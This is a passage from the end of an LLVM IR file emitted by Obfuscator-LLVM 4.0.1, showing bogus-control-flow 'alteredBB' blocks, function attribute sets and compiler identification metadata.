  br label %originalBB22

originalBB34alteredBB:                            ; preds = %originalBB34, %192
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %209
  store i32 0, i32* %10, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %226
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %244
  %288 = load i32, i32* %4, align 4
  br label %originalBB46
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146842976}
!2 = !{i32 -2146842567}
